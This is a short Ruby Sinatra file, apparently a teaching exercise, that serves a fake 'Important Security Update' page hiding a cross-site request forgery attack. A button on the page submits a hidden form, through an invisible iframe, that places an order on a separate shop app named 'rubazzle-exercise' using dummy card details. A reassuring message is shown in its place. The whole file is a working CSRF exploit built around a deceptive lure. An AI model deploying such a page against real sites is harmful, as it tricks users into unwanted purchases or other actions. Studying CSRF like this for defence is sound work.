require 'sinatra'

get '/' do
  'Welcome to the Important Security Update Homepage!!!! Do you want to receive Important Security Updates?
  Click the button to agree!
  <iframe style="width: 0px; height: 0px; visibility: hidden" name="hidden-frame"></iframe>
  <form name="csrf" action="http://rubazzle-exercise.herokuapp.com/orders" method="POST" enctype="application/json" target="hidden-frame">
  <input type="hidden" name="order[product]" value="Super Rubazzle Case"/>
  <input type="hidden" name="order[quantity]" value=1/>
  <input type="hidden" name="order[price]" value=16.50/>
  <input type="hidden" name="order[cc]" value="3333444455556666"/>
  <input type="hidden" name="order[cvv]" value="777"/>
  <input type="hidden" name="order[expiration]" value="07/20"/>
  <input type="hidden" name="order[first_name]" value="This order came from "/>
  <input type="hidden" name="order[last_name]" value="a CSRF attack!!!"/>
  <input type="submit" id="button" value="Yes! I want to receive important security updates!"/>
  </form>
  <div id="success"></div>
  <script>document.getElementById("button").onclick = function(e) { document.getElementById("success").innerText = "You will be receiving security updates soon!"; }</script>'
end
